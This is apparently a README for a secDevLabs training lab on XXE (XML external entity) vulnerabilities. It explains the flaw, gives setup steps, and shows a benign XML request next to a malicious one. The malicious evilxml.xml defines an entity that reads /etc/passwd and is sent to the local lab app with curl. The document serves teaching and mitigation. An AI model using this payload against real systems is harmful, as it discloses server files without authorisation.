# XXE--

Many older or poorly configured XML processors evaluate external entity references within XML documents. External entities can be used to disclose internal files using the file URI handler, internal file shares, internal port scanning, remote code execution, and denial of service attacks.

The main goal of this app is to discuss how **XXE** vulnerabilities can be exploited and to encourage developers to send secDevLabs Pull Requests on how they would mitigate these flaws.

## Setup


    make install


Then simply visit [localhost:10004][App] ! 😆





```XML
<?xml version="1.0" encoding="UTF-8"?>
<contact>
    <name>RAFAEL</name>
    <email>RAFAEL@EXAMPLE.com</email>
    <subject>YOU ROCK</subject>
    <message>I LOVE WATCHING YOUR SKILLS, MAN</message>
</contact>
```

And  run:

    curl -d @payload.xml localhost:10004/contact.php ; echo

evilxml.xml

    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE root [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <contact>
    <name>&xxe;</name>
    <email>RAFAEL@EXAMPLE.com</email>
    <subject>YOU ROCK</subject>
    <message>I LOVE WATCHING YOUR SKILLS, MAN</message>
    </contact>

Attack :

    curl -d @evilxml.xml localhost:10004/contact.php ; echo
